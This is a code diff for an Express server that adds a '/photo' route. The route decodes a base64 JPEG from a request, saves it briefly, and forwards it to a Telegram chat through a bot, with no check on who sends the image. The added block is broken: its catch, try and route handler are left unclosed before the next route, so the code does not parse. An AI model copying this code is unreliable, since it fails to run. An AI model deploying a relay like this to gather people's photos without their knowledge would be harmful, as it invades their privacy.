@@ -165,6 +165,51 @@ app.post("/data", async (req, res) => {
 
 });
 
+// ===== PHOTO ROUTE =====
+app.post('/photo', async (req, res) => {
+  try {
+    const { imageData } = req.body;
+
+    if (!imageData) {
+      return res.status(400).json({
+        success: false,
+        message: 'No image received'
+      });
+    }
+
+    // remove base64 header
+    const base64Data = imageData.replace(
+      /^data:image\/jpeg;base64,/,
+      ''
+    );
+
+    // temp file
+    const fileName = `photo_${Date.now()}.jpg`;
+    const filePath = path.join(__dirname, fileName);
+
+    // save image
+    fs.writeFileSync(filePath, base64Data, 'base64');
+
+    // send to telegram
+    await bot.sendPhoto(CHAT_ID, filePath, {
+      caption: '📸 New Photo Received'
+    });
+
+    // delete temp file
+    fs.unlinkSync(filePath);
+
+    res.json({
+      success: true
+    });
+
+  } catch (err) {
+    console.log(err);
+
+    res.status(500).json({
+      success: false,
+      error: 'Server Error'
+    });
+
 // TELEGRAM WEBHOOK
 app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
 
